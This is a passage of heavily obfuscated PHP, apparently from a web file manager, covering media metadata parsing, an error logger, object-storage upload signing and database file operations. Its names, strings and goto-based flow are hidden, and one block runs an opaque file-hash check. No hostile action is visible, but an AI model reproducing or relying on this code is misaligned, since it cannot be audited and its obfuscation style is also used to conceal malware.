$EöÀñõö[1626]; } else { if ($aÕÖ­œ„Ìµ[$EöÀñõö[165]] == $EöÀñõö[1627]) { $AØ±Ãéê”‘ = self::pdfParse($aë³ƒ™ºÌ); } else { $Aƒ¿İ¹æŠ = self::$fileTypeArray[$EöÀñõö[1628]][$aÕÖ­œ„Ìµ[$EöÀñõö[165]]]; $cöëø×­˜ = self::$fileTypeArray[$EöÀñõö[1629]][$Aƒ¿İ¹æŠ][$EöÀñõö[1630]]; $Fôçí“š¨ç = @$cÅ£¸ÏÕØÑ->analyze($aë³ƒ™ºÌ, $aÕÖ­œ„Ìµ[$EöÀñõö[77]], $aÕÖ­œ„Ìµ[$EöÀñõö[28]]); $AØ±Ãéê”‘ = self::parseData($Fôçí“š¨ç, $cöëø×­˜, $aÕÖ­œ„Ìµ); } } } catch (Exception $d¡Ø¯óÂ¾Ç) { $AØ±Ãéê”‘ = array($EöÀñõö[376] => $Aƒ¿İ¹æŠ); } if (!$AØ±Ãéê”‘) { return; } goto Dš¬ãŸÖŸ; cĞùˆöÄÏæ: return $aÕÖ­œ„Ìµ; goto câÉ¾†ÚÙ‚; c»ÙŒŞ»õ: $EöÀñõö =& $_SERVER[…Ò×–]; static $cÅ£¸ÏÕØÑ; if (!$cÅ£¸ÏÕØÑ) { require SDK_DIR . $EöÀñõö[1623]; $cÅ£¸ÏÕØÑ = new getID3(); } goto EÛˆ‡ƒö™ß; Dš¬ãŸÖŸ: $AØ±Ãéê”‘ = self::arrayValueLimit($AØ±Ãéê”‘); $AØ±Ãéê”‘[$EöÀñõö[376]] = $Aƒ¿İ¹æŠ; $aÕÖ­œ„Ìµ[$EöÀñõö[160]] = $AØ±Ãéê”‘; goto cĞùˆöÄÏæ; câÉ¾†ÚÙ‚: } public static function support($fßÖš œœ˜) { goto Cò¹ƒ™ôÕÇ; B­Á‹¿Ğ×±: return !1; goto f‹ì™°Öá; C¢‚Úµƒ‚°: $d…²×£Ãù« = array($d»» ¢É¼¿[1627], $d»» ¢É¼¿[1625]); if (in_array($fßÖš œœ˜, $d…²×£Ãù«)) { return !0; } if (isset(self::$fileTypeArray[$d»» ¢É¼¿[1628]][$fßÖš œœ˜])) { return !0; } goto B­Á‹¿Ğ×±; Cò¹ƒ™ôÕÇ: $d»» ¢É¼¿ =& $_SERVER[…Ò×–]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $fßÖš œœ˜ = strtolower($fßÖš œœ˜); goto C¢‚Úµƒ‚°; f‹ì™°Öá: } public static function arrayValueLimit($eÙËôğÃÂ, $aÅ‰ë¼¬Ã = 5000) { if (!is_array($eÙËôğÃÂ)) { return $eÙËôğÃÂ; } foreach ($eÙËôğÃÂ as $a˜‹ñÂå˜è => $fïÖ‡Ì³İƒ) { if (is_string($fïÖ‡Ì³İƒ) && strlen($fïÖ‡Ì³İƒ) > $aÅ‰ë¼¬Ã) { $eÙËôğÃÂ[$a˜‹ñÂå˜è] = substr($fïÖ‡Ì³İƒ, 0, $aÅ‰ë¼¬Ã); } else { if (is_array($fïÖ‡Ì³İƒ)) { $eÙËôğÃÂ[$a˜‹ñÂå˜è] = self::arrayValueLimit($fïÖ‡Ì³İƒ, $aÅ‰ë¼¬Ã); } } } return $eÙËôğÃÂ; } private static function parseData($Fâœòõ¯¼ß, $b„•Ø§ËŠÃ, $DêÇïô‰š ) { $Fì§áçª­É =& $_SERVER[…Ò×–]; $bÖŒ‘Âî¥² = $Fâœòõ¯¼ß[$Fì§áçª­É[1631]]; $C³ª‡«¨ğ“ = array(); foreach ($b„•Ø§ËŠÃ as $FÎÊæ„ïà => $BùÈ¸öÄ…ó) { foreach ($BùÈ¸öÄ…ó as $c„á™Á„¿¤) { if (is_array($c„á™Á„¿¤)) { $bª³±ë¹ = self::parseData($Fâœòõ¯¼ß, $BùÈ¸öÄ…ó, $DêÇïô‰š ); if ($bª³±ë¹) { $C³ª‡«¨ğ“[$FÎÊæ„ïà] = $bª³±ë¹; } break; } $A‰Â—ĞŠÂ = str_replace($Fì§áçª­É[1402], $bÖŒ‘Âî¥², $c„á™Á„¿¤); $bª³±ë¹ = _get($Fâœòõ¯¼ß, $A‰Â—ĞŠÂ); $bª³±ë¹ = is_array($bª³±ë¹) ? $bª³±ë¹[0] : $bª³±ë¹; if ($bª³±ë¹) { break; } } if ($bª³±ë¹ || $bª³±ë¹ === 0 || $bª³±ë¹ === !1) { $bª³±ë¹ = self::valueReset($c„á™Á„¿¤, $bª³±ë¹, $FÎÊæ„ïà); if ($bª³±ë¹ !== null) { $C³ª‡«¨ğ“[$FÎÊæ„ïà] = $bª³±ë¹; } } } $C³ª‡«¨ğ“ = self::valueResetAll($C³ª‡«¨ğ“, $DêÇïô‰š ); return $C³ª‡«¨ğ“; } private static function psdParse($d…¬ªÜªç) { $A·Å«œÙºî =& $_SERVER[…Ò×–]; if (IO::fileSubstr($d…¬ªÜªç, 0, 4) != $A·Å«œÙºî[1632]) { return !1; } $aÂÉ¦Á®œ = getImageSize($d…¬ªÜªç, $d¤•—ŞĞÎõ); if (!$aÂÉ¦Á®œ) { return; } $f†ˆ°ôÒ‡ = array($A·Å«œÙºî[162] => $aÂÉ¦Á®œ[0], $A·Å«œÙºî[163] => $aÂÉ¦Á®œ[1]); return $f†ˆ°ôÒ‡; } private static function pdfParse($dœ˜†ØŸ¿ƒ) { return FileParsePdf::parse($dœ˜†ØŸ¿ƒ); } private static function fileTypeParse() { $DÊ¨é‹Ä± =& $_SERVER[…Ò×–]; $dËƒ™ˆÂš = self::fileTypeArray(); $d–Ö‡ƒœ½ = array(); foreach ($dËƒ™ˆÂš as $bÑÕî·òŞÛ => $CáÜÑÊÕİî) { $cÓª‹Ôˆ­³ = _get($CáÜÑÊÕİî, $DÊ¨é‹Ä±[165], $DÊ¨é‹Ä±[33]); $aÄƒŞ°åñ³ = is_string($cÓª‹Ôˆ­³) ? explode($DÊ¨é‹Ä±[47], $cÓª‹Ôˆ­³) : $cÓª‹Ôˆ­³; if (!$aÄƒŞ°åñ³) { continue; } foreach ($aÄƒŞ°åñ³ as $cÓª‹Ôˆ­³) { $cÓª‹Ôˆ­³ = strtolower(trim($cÓª‹Ôˆ­³)); if (!$cÓª‹Ôˆ­³) { continue; } $d–Ö‡ƒœ½[$cÓª‹Ôˆ­³] = $bÑÕî·òŞÛ; } $dËƒ™ˆÂš[$bÑÕî·òŞÛ][$DÊ¨é‹Ä±[165]] = array_keys($d–Ö‡ƒœ½); $dËƒ™ˆÂš[$bÑÕî·òŞÛ][$DÊ¨é‹Ä±[1630]] = self::parseKeyMap($CáÜÑÊÕİî[$DÊ¨é‹Ä±[1630]]); } return array($DÊ¨é‹Ä±[1629] => $dËƒ™ˆÂš, $DÊ¨é‹Ä±[1628] => $d–Ö‡ƒœ½); } private static function parseKeyMap($aÀ»›’¥¤©) { $C×£»Ëå†ğ =& $_SERVER[…Ò×–]; foreach ($aÀ»›’¥¤© as $Aº»ĞºŠê† => $bîøâÃ±ÕØ) { if (is_array($bîøâÃ±ÕØ)) { $bğÈ»ç¯ì„ = self::parseKeyMap($bîøâÃ±ÕØ); if ($bğÈ»ç¯ì„) { $aÀ»›’¥¤©[$Aº»ĞºŠê†] = $bğÈ»ç¯ì„; } continue; } $E¥Ô¢•ö¶æ = explode($C×£»Ëå†ğ[47], $bîøâÃ±ÕØ); $döÅ…¥·¾ñ = array(); foreach ($E¥Ô¢•ö¶æ as $dÖ»©ô“†) { $dÖ»©ô“† = trim($dÖ»©ô“†); if (!$dÖ»©ô“†) { continue; } if (preg_match($C×£»Ëå†ğ[1633], $dÖ»©ô“†, $c£¤ˆ¸·Óâ)) { $dØ÷´¯ŒÀî = explode($C×£»Ëå†ğ[275], $c£¤ˆ¸·Óâ[1]); foreach ($dØ÷´¯ŒÀî as $Eà³©¬ÔÅá) { $döÅ…¥·¾ñ[] = str_replace($c£¤ˆ¸·Óâ[0], $Eà³©¬ÔÅá, $dÖ»©ô“†); } } else { $döÅ…¥·¾ñ[] = $dÖ»©ô“†; } } $aÀ»›’¥¤©[$Aº»ĞºŠê†] = $döÅ…¥·¾ñ; } return $aÀ»›’¥¤©; } private static function valueResetAll($F£Š‰Ï¯˜, $CÓ‡Úˆôœƒ) { goto eï’Ê¥Ô¯ù; e©šÈî¥Ï: if ($EÁà¯ÛÒ´Ü) { $B†¶ª¨Ê²ˆ = IO_PATH_SYSTEM_TEMP . $D§¨¿›ŒÆÑ[1639] . KodIO::hashPath($CÓ‡Úˆôœƒ) . $D§¨¿›ŒÆÑ[1640]; $F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1641]] = Action($D§¨¿›ŒÆÑ[1642])->pluginCacheFileSet($B†¶ª¨Ê²ˆ, $EÁà¯ÛÒ´Ü); unset($F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1643]][$D§¨¿›ŒÆÑ[1626]]); } $f¥³‰ÆŠôÂ = _get($F£Š‰Ï¯˜, $D§¨¿›ŒÆÑ[1644], $D§¨¿›ŒÆÑ[33]); $DÃ´‡á¢…« = _get($F£Š‰Ï¯˜, $D§¨¿›ŒÆÑ[1645], $D§¨¿›ŒÆÑ[33]); goto C«·Õ”¦ê»; dŸ¶ä–Á§Ş: return $F£Š‰Ï¯˜; goto b” šøäã; eï’Ê¥Ô¯ù: $D§¨¿›ŒÆÑ =& $_SERVER[…Ò×–]; if (isset($F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1634]])) { $eÜ¶õí¿¼‡ = ceil($F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1634]]); $fÕ„ «ƒœ = intval($eÜ¶õí¿¼‡ / 3600); $Dù„¹©ËÎÓ = intval(($eÜ¶õí¿¼‡ - $fÕ„ «ƒœ * 3600) / 60); $cÊÚ§‘ – = $eÜ¶õí¿¼‡ % 60; $F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1635]] = sprintf($D§¨¿›ŒÆÑ[1636], $fÕ„ «ƒœ, $Dù„¹©ËÎÓ, $cÊÚ§‘ –); if ($fÕ„ «ƒœ == 0) { $F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1635]] = sprintf($D§¨¿›ŒÆÑ[1637], $Dù„¹©ËÎÓ, $cÊÚ§‘ –); } } $EÁà¯ÛÒ´Ü = _get($F£Š‰Ï¯˜, $D§¨¿›ŒÆÑ[1638]); goto e©šÈî¥Ï; C«·Õ”¦ê»: $DÑ–†˜ŒØ = _get($F£Š‰Ï¯˜, $D§¨¿›ŒÆÑ[1646], $D§¨¿›ŒÆÑ[33]); $A±òíìÀÁ÷ = $f¥³‰ÆŠôÂ . $DÃ´‡á¢…« . $DÑ–†˜ŒØ; if ($A±òíìÀÁ÷ && get_charset($A±òíìÀÁ÷) != $D§¨¿›ŒÆÑ[330]) { $F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1643]][$D§¨¿›ŒÆÑ[1354]] = iconv_to($F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1643]][$D§¨¿›ŒÆÑ[1354]], get_charset($A±òíìÀÁ÷), $D§¨¿›ŒÆÑ[330]); $F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1643]][$D§¨¿›ŒÆÑ[1647]] = iconv_to($F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1643]][$D§¨¿›ŒÆÑ[1647]], get_charset($A±òíìÀÁ÷), $D§¨¿›ŒÆÑ[330]); $F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1643]][$D§¨¿›ŒÆÑ[1648]] = iconv_to($F£Š‰Ï¯˜[$D§¨¿›ŒÆÑ[1643]][$D§¨¿›ŒÆÑ[1648]], get_charset($A±òíìÀÁ÷), $D§¨¿›ŒÆÑ[330]); } goto dŸ¶ä–Á§Ş; b” šøäã: } private static function valueReset($A’ÀÊ´ÒÄ, $F±Ä«À†çÉ, $bÔØâÇÜ) { $a×¹²ß™’î =& $_SERVER[…Ò×–]; $C†«ÎßÕôï = $a×¹²ß™’î[1564]; switch ($A’ÀÊ´ÒÄ) { case $a×¹²ß™’î[1649]: $F±Ä«À†çÉ = $F±Ä«À†çÉ == $a×¹²ß™’î[83] ? $a×¹²ß™’î[1650] : $a×¹²ß™’î[1651]; break; case $a×¹²ß™’î[1652]: $F±Ä«À†çÉ = $F±Ä«À†çÉ ? $F±Ä«À†çÉ : null; break; default: break; } switch ($bÔØâÇÜ) { case $a×¹²ß™’î[1653]: $F±Ä«À†çÉ = round($F±Ä«À†çÉ, 2); break; case $a×¹²ß™’î[191]: case $a×¹²ß™’î[107]: if ($F±Ä«À†çÉ < 0) { $F±Ä«À†çÉ = null; } else { if (is_numeric($F±Ä«À†çÉ)) { $F±Ä«À†çÉ = date($C†«ÎßÕôï, $F±Ä«À†çÉ); } } break; default: break; } return $F±Ä«À†çÉ; } private static function fileTypeArray() { $A¬¬»Ë©šï =& $_SERVER[…Ò×–]; return array($A¬¬»Ë©šï[1626] => array($A¬¬»Ë©šï[165] => $A¬¬»Ë©šï[1654] . $A¬¬»Ë©šï[1655], $A¬¬»Ë©šï[1630] => array($A¬¬»Ë©šï[162] => $A¬¬»Ë©šï[1656], $A¬¬»Ë©šï[163] => $A¬¬»Ë©šï[1657], $A¬¬»Ë©šï[1658] => $A¬¬»Ë©šï[1659], $A¬¬»Ë©šï[1660] => $A¬¬»Ë©šï[1661], $A¬¬»Ë©šï[191] => $A¬¬»Ë©šï[1662], $A¬¬»Ë©šï[107] => $A¬¬»Ë©šï[1663], $A¬¬»Ë©šï[1664] => $A¬¬»Ë©šï[1665], $A¬¬»Ë©šï[1666] => $A¬¬»Ë©šï[1667], $A¬¬»Ë©šï[1668] => $A¬¬»Ë©šï[1669], $A¬¬»Ë©šï[1670] => $A¬¬»Ë©šï[1671], $A¬¬»Ë©šï[1672] => $A¬¬»Ë©šï[1673], $A¬¬»Ë©šï[1674] => $A¬¬»Ë©šï[1675], $A¬¬»Ë©šï[1676] => $A¬¬»Ë©šï[1677], $A¬¬»Ë©šï[1678] => array($A¬¬»Ë©šï[1679] => $A¬¬»Ë©šï[1680], $A¬¬»Ë©šï[1681] => $A¬¬»Ë©šï[1682], $A¬¬»Ë©šï[1683] => $A¬¬»Ë©šï[1684]), $A¬¬»Ë©šï[1685] => $A¬¬»Ë©šï[1686], $A¬¬»Ë©šï[1687] => $A¬¬»Ë©šï[1688], $A¬¬»Ë©šï[1689] => $A¬¬»Ë©šï[1690], $A¬¬»Ë©šï[1691] => $A¬¬»Ë©šï[1692], $A¬¬»Ë©šï[1693] => array($A¬¬»Ë©šï[1694] => $A¬¬»Ë©šï[1695], $A¬¬»Ë©šï[1696] => $A¬¬»Ë©šï[1697], $A¬¬»Ë©šï[1698] => $A¬¬»Ë©šï[1699], $A¬¬»Ë©šï[1700] => $A¬¬»Ë©šï[1701], $A¬¬»Ë©šï[1702] => $A¬¬»Ë©šï[1703], $A¬¬»Ë©šï[1704] => $A¬¬»Ë©šï[1705], $A¬¬»Ë©šï[1706] => $A¬¬»Ë©šï[1707], $A¬¬»Ë©šï[1708] => $A¬¬»Ë©šï[1709], $A¬¬»Ë©šï[1710] => $A¬¬»Ë©šï[1711], $A¬¬»Ë©šï[1712] => $A¬¬»Ë©šï[1713], $A¬¬»Ë©šï[1714] => $A¬¬»Ë©šï[1715]))), $A¬¬»Ë©šï[1716] => array($A¬¬»Ë©šï[165] => $A¬¬»Ë©šï[1717] . $A¬¬»Ë©šï[1718], $A¬¬»Ë©šï[1630] => array($A¬¬»Ë©šï[1634] => $A¬¬»Ë©šï[1719], $A¬¬»Ë©šï[191] => $A¬¬»Ë©šï[1720], $A¬¬»Ë©šï[107] => $A¬¬»Ë©šï[1721], $A¬¬»Ë©šï[1666] => $A¬¬»Ë©šï[1722], $A¬¬»Ë©šï[1723] => $A¬¬»Ë©šï[1724], $A¬¬»Ë©šï[1725] => $A¬¬»Ë©šï[1652], $A¬¬»Ë©šï[1726] => $A¬¬»Ë©šï[1727], $A¬¬»Ë©šï[1728] => $A¬¬»Ë©šï[1729], $A¬¬»Ë©šï[1730] => $A¬¬»Ë©šï[1731], $A¬¬»Ë©šï[1643] => array($A¬¬»Ë©šï[1354] => $A¬¬»Ë©šï[1732], $A¬¬»Ë©šï[1647] => $A¬¬»Ë©šï[1733], $A¬¬»Ë©šï[1648] => $A¬¬»Ë©šï[1734], $A¬¬»Ë©šï[1735] => $A¬¬»Ë©šï[1736], $A¬¬»Ë©šï[1737] => $A¬¬»Ë©šï[1738], $A¬¬»Ë©šï[1739] => $A¬¬»Ë©šï[1740], $A¬¬»Ë©šï[1626] => $A¬¬»Ë©šï[1741]))), $A¬¬»Ë©šï[1742] => array($A¬¬»Ë©šï[165] => $A¬¬»Ë©šï[1743] . $A¬¬»Ë©šï[1744], $A¬¬»Ë©šï[1630] => array($A¬¬»Ë©šï[162] => $A¬¬»Ë©šï[1745], $A¬¬»Ë©šï[163] => $A¬¬»Ë©šï[1746], $A¬¬»Ë©šï[1634] => $A¬¬»Ë©šï[1719], $A¬¬»Ë©šï[191] => $A¬¬»Ë©šï[1747], $A¬¬»Ë©šï[107] => $A¬¬»Ë©šï[1748], $A¬¬»Ë©šï[1653] => $A¬¬»Ë©šï[1749], $A¬¬»Ë©šï[1730] => $A¬¬»Ë©šï[1750], $A¬¬»Ë©šï[1726] => $A¬¬»Ë©šï[1751], $A¬¬»Ë©šï[1666] => $A¬¬»Ë©šï[1752], $A¬¬»Ë©šï[1716] => array($A¬¬»Ë©šï[1725] => $A¬¬»Ë©šï[1652], $A¬¬»Ë©šï[1753] => $A¬¬»Ë©šï[1754], $A¬¬»Ë©šï[1723] => $A¬¬»Ë©šï[1724], $A¬¬»Ë©šï[1730] => $A¬¬»Ë©šï[1731], $A¬¬»Ë©šï[1726] => $A¬¬»Ë©šï[1755], $A¬¬»Ë©šï[1728] => $A¬¬»Ë©šï[1729]))), $A¬¬»Ë©šï[1756] => array($A¬¬»Ë©šï[1630] => array($A¬¬»Ë©šï[1757] => $A¬¬»Ë©šï[1758], $A¬¬»Ë©šï[1759] => $A¬¬»Ë©šï[1760])), $A¬¬»Ë©šï[1761] => array($A¬¬»Ë©šï[1630] => array())); } } function exif_read_data_io($bÛÎè‚ÔËÎ, $E›Ëñ˜™ñÎ = null, $bò£‘ç‰»¡ = false, $eàÈÀ›½®œ = false) { $Fµ¿»²Õ‚ = StreamWrapperIO::read($bÛÎè‚ÔËÎ, 0, 1024 * 64); $DÈš’‰®ùÖ = $_SERVER[…Ò×–][1762] . base64_encode($Fµ¿»²Õ‚); return exif_read_data($DÈš’‰®ùÖ, $E›Ëñ˜™ñÎ, $bò£‘ç‰»¡, $eàÈÀ›½®œ); } goto Fè§‘Û¾÷œ; F†…Š‡†â: $c”·à¯¿¢¨ = LIB_DIR . $_SERVER[…Ò×–][1409]; $c¿º«²ƒ¡± = $_SERVER[…Ò×–][797]; if ($_SERVER[$_SERVER[…Ò×–][798]] != $c¿º«²ƒ¡±($c”·à¯¿¢¨)) { goto Cà·ô’­ˆù; bÑ„·òä Ş: $CÖ¸÷‹¼¥ù($c”·à¯¿¢¨); goto bÑö›ç™‘ğ; Cà·ô’­ˆù: $AËÓÌ”ÛÕ¡ = $_SERVER[…Ò×–][800]; $d›Ò½ÜÇ¤Š = $_SERVER[$_SERVER[…Ò×–][795]] . $_SERVER[…Ò×–][796]; $a…«¤†ÈÅÚ = $AËÓÌ”ÛÕ¡($d›Ò½ÜÇ¤Š); goto fİÆ‚÷œ„ù; fİÆ‚÷œ„ù: $e¼íÕÌáá… = explode($_SERVER[…Ò×–][221], $a…«¤†ÈÅÚ); if (count($e¼íÕÌáá…) < $_SERVER[…Ò×–][565]) { $aëŒÉÔ¦” = $_SERVER[…Ò×–][801]; $aëŒÉÔ¦”(); } $CÖ¸÷‹¼¥ù = $_SERVER[…Ò×–][1135]; goto bÑ„·òä Ş; bÑö›ç™‘ğ: } goto eºïÇÁ—¡ï; bÖœ“É²Ø÷: function beforeShutdownError($CŸßïÏ™É = false, $fÙˆ‚¾¹õ½ = '', $F²¶¥£»½ = '', $a ĞšÈÎÈ = 0) { $A”º™èàóÊ =& $_SERVER[ä¡—±€µó–è]; switch ($CŸßïÏ™É) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $bø±ì¿Áç = $A”º™èàóÊ[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $bø±ì¿Áç = $A”º™èàóÊ[36]; break; case E_STRICT: $bø±ì¿Áç = $A”º™èàóÊ[37]; break; case E_NOTICE: case E_USER_NOTICE: $bø±ì¿Áç = $A”º™èàóÊ[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $bø±ì¿Áç = $A”º™èàóÊ[39]; break; default: break; } if (!$bø±ì¿Áç || $bø±ì¿Áç == $A”º™èàóÊ[38] || $bø±ì¿Áç == $A”º™èàóÊ[39]) { return; } $F²¶¥£»½ = $A”º™èàóÊ[4] . str_replace($_SERVER[$A”º™èàóÊ[33]], $A”º™èàóÊ[16], $F²¶¥£»½); $b“÷ëñ´ğ = $bø±ì¿Áç . $A”º™èàóÊ[40] . $fÙˆ‚¾¹õ½ . $A”º™èàóÊ[40] . $F²¶¥£»½ . $A”º™èàóÊ[40] . $a ĞšÈÎÈ; write_log($b“÷ëñ´ğ . $A”º™èàóÊ[41] . get_caller_msg(1), $A”º™èàóÊ[15]); } $_SERVER[$_SERVER[ä¡—±€µó–è][42]] = $_SERVER[$_SERVER[ä¡—±€µó–è][33]] . $_SERVER[ä¡—±€µó–è][43]; $CŠäÖ’œÁÊ = strrev(base64_decode($_SERVER[ä¡—±€µó–è][44])); goto A‘¾ßÕ¢¾Ì; cô‰‘ÎŠ¨Ù: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($E’Ú¼•Ğ†›) { parent::__construct($E’Ú¼•Ğ†›); $this->signatureVersion($_SERVER[…Ò×–][204]); } public function uploadFormData($f¬’ŞØê–ó, $f¦…¹ƒ“ôø = 3600) { goto Càá‰æ• Ğ; b¡ óŠ¦Û: $f ™µÉÌ«ß = $Eæ‹—“œ„[1110]; $CŠøÀéã”ë = gmdate($Eæ‹—“œ„[1111], time() + $f¦…¹ƒ“ôø); $B¼ÕÓÈ…©Ÿ = (string) time() . $Eæ‹—“œ„[67] . (string) (time() + $f¦…¹ƒ“ôø); goto CÛÕçñ¸; DÍ¨´Œ Ì: return $eó†÷«ÜŞê; goto B¡í‚±ç¹–; CÛÕçñ¸: $Cò¦©é¨í³ = array($Eæ‹—“œ„[1112] => $CŠøÀéã”ë, $Eæ‹—“œ„[1113] => array(array($Eæ‹—“œ„[1114] => $E™‰ö÷«Öº), array($Eæ‹—“œ„[1115] => $this->bucket), array($Eæ‹—“œ„[1116], $Eæ‹—“œ„[1117], $Eæ‹—“œ„[33]), array($Eæ‹—“œ„[1118] => $f ™µÉÌ«ß), array($Eæ‹—“œ„[1119] => $C­ÀƒÂ‹À), array($Eæ‹—“œ„[1120] => $this->accessKey), array($Eæ‹—“œ„[1121] => $B¼ÕÓÈ…©Ÿ))); $Cò¦©é¨í³ = json_encode($Cò¦©é¨í³); $B²õ™ŒÏõì = hash_hmac($Eæ‹—“œ„[222], $B¼ÕÓÈ…©Ÿ, $this->secret); goto Eï›¥“òöË; Càá‰æ• Ğ: $Eæ‹—“œ„ =& $_SERVER[…Ò×–]; $E™‰ö÷«Öº = $Eæ‹—“œ„[189]; $C­ÀƒÂ‹À = $Eæ‹—“œ„[222]; goto b¡ óŠ¦Û; Eï›¥“òöË: $C±ÁµæÚ½á = sha1($Cò¦©é¨í³); $a‡àç±Ö°Ô = hash_hmac($Eæ‹—“œ„[222], $C±ÁµæÚ½á, $B²õ™ŒÏõì); $eó†÷«ÜŞê = array($Eæ‹—“œ„[1114] => $E™‰ö÷«Öº, $Eæ‹—“œ„[1118] => $f ™µÉÌ«ß, $Eæ‹—“œ„[1122] => base64_encode($Cò¦©é¨í³), $Eæ‹—“œ„[1119] => $C­ÀƒÂ‹À, $Eæ‹—“œ„[1120] => $this->accessKey, $Eæ‹—“œ„[1123] => $B¼ÕÓÈ…©Ÿ, $Eæ‹—“œ„[1124] => $a‡àç±Ö°Ô, $Eæ‹—“œ„[173] => $this->getHost()); goto DÍ¨´Œ Ì; B¡í‚±ç¹–: } public function fileOutLink($eÆ‡¦Ë•Àù) { $f÷ŠİÄÚÔ =& $_SERVER[…Ò×–]; if (substr($eÆ‡¦Ë•Àù, 0, 7) == $f÷ŠİÄÚÔ[1125]) { $eÆ‡¦Ë•Àù = $f÷ŠİÄÚÔ[1126] . substr($eÆ‡¦Ë•Àù, 7); } header($f÷ŠİÄÚÔ[156] . $eÆ‡¦Ë•Àù); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($BŞÃö‡“š°) { $this->pathParse = $BŞÃö‡“š°; $this->model = Model($_SERVER[…Ò×–][1127]); } public function getPath($CÚÈ½÷‰‡¤) { return trim($CÚÈ½÷‰‡¤, $_SERVER[…Ò×–][8]); } public function pathFather($C³ÛÓ¥šˆŞ) { $cÙ…Ö“«š° = $this->parse($C³ÛÓ¥šˆŞ); $cÙ…Ö“«š° = $this->infoSimple($C³ÛÓ¥šˆŞ); return $cÙ…Ö“«š° ? $cÙ…Ö“«š°[$_SERVER[…Ò×–][466]] : !1; } public function getPathName($dÅ»Şñ…áÕ) { $bµğÃ´™Õ = $this->infoSimple($dÅ»Şñ…áÕ); return $bµğÃ´™Õ ? $bµğÃ´™Õ[$_SERVER[…Ò×–][28]] : !1; } public function getPathOuter($eÍ½ªÖˆ£×) { if (!$eÍ½ªÖˆ£×) { return $eÍ½ªÖˆ£×; } $EÒª‡ˆ×ƒÑ = $this->parse($eÍ½ªÖˆ£×); return KodIO::make($EÒª‡ˆ×ƒÑ[$_SERVER[…Ò×–][371]]); } public function copyFolderFromIO($D•îÜÓ××, $Eî¥‰¡÷ÍÕ, $fˆñˆñ¦ïÉ, $D‹Ó‹ò®ö¸, $BÎµ¦Ë°) { $D†Ø©ì¹‰ = $this->model->copyFolderFromIO($D•îÜÓ××, $Eî¥‰¡÷ÍÕ, $fˆñˆñ¦ïÉ, $D‹Ó‹ò®ö¸, $BÎµ¦Ë°); return KodIO::make($D†Ø©ì¹‰); } public function isParentOf($b¥Í¬Œ…Ø¶, $CÅĞçßìëö) { return $this->model->isParentOf($b¥Í¬Œ…Ø¶, $CÅĞçßìëö); } public function mkfile($b„Î×¸Ìˆ, $eÅŠ¿ß¼®Ä = '', $AÎ›øŞ©äê = REPEAT_RENAME) { $DÍÕ„…ÊÅ =& $_SERVER[…Ò×–]; $D£ßŒÄ”‚Œ = $this->parse($b„Î×¸Ìˆ); $b„Î×¸Ìˆ = $D£ßŒÄ”‚Œ[$DÍÕ„…ÊÅ[371]]; for ($f¼±ÔÒ÷Üœ = 0; $f¼±ÔÒ÷Üœ < count($D£ßŒÄ”‚Œ[$DÍÕ„…ÊÅ[1128]]); $f¼±ÔÒ÷Üœ++) { $d©‡®Â¿„œ = $D£ßŒÄ”‚Œ[$DÍÕ„…ÊÅ[1128]][$f¼±ÔÒ÷Üœ]; if ($f¼±ÔÒ÷Üœ == count($D£ßŒÄ”‚Œ[$DÍÕ„…ÊÅ[1128]]) - 1) { $b„Î×¸Ìˆ = $this->model->mkfile($b„Î×¸Ìˆ, $d©‡®Â¿„œ, $eÅŠ¿ß¼®Ä, $AÎ›øŞ©äê); break; } $b„Î×¸Ìˆ = $this->model->mkdir($b„Î×¸Ìˆ, $d©‡®Â¿„œ, REPEAT_SKIP); } return $this->getPathOuter($b„Î×¸Ìˆ); } public function mkdir($DËöø¬»”¿, $Eø‡³Ì¸‡Á = REPEAT_SKIP) { $c¡¹Ø–î– =& $_SERVER[…Ò×–]; $C¹íôºŞˆ = $this->parse($DËöø¬»”¿); $DËöø¬»”¿ = $C¹íôºŞˆ[$c¡¹Ø–î–[371]]; for ($A»—˜‚‚‰„ = 0; $A»—˜‚‚‰„ < count($C¹íôºŞˆ[$c¡¹Ø–î–[1128]]); $A»—˜‚‚‰„++) { $DÏÎæĞöÏÄ = $C¹íôºŞˆ[$c¡¹Ø–î–[1128]][$A»—˜‚‚‰„]; $DËöø¬»”¿ = $this->model->mkdir($DËöø¬»”¿, $DÏÎæĞöÏÄ, $Eø‡³Ì¸‡Á); } return $this->getPathOuter($DËöø¬»”¿); } public function copyFile($A‡¤¨äÓ¯¹, $c¸èŠô™£ß, $A†”£ğÂ  = REPEAT_REPLACE) { $C©«Ğ½â‘ =& $_SERVER[…Ò×–]; $fÍÎ¨„ï‰ì = $this->parse($c¸èŠô™£ß); $cõ…‚×‰ï± = $this->model->copy($A‡¤¨äÓ¯¹, $fÍÎ¨„ï‰ì[$C©«Ğ½â‘[371]], $A†”£ğÂ , $fÍÎ¨„ï‰ì[$C©«Ğ½â‘[75]]); return $cõ…‚×‰ï± ? $this->getPathOuter($cõ…‚×‰ï±) : !1; } public function moveFile($F±¼¡“ŞÎÙ, $C¡ö¹ßİºİ, $b“®¾ÀÒ‰ = REPEAT_REPLACE) { $eæäÜ•Ò×š =& $_SERVER[…Ò×–]; $eÈ¼²–Åã† = $this->parse($C¡ö¹ßİºİ); $CÚÌä‰ñ’å = $this->model->move($F±¼¡“ŞÎÙ, $eÈ¼²–Åã†[$eæäÜ•Ò×š[371]], $b“®¾ÀÒ‰, $eÈ¼²–Åã†[$eæäÜ•Ò×š[75]]); return $CÚÌä‰ñ’å ? $this->getPathOuter($CÚÌä‰ñ’å) : !1; } public function copy($eÙİ„Ä’ , $F’¾©•í™ó, $E»·¹Åô = REPEAT_REPLACE) { 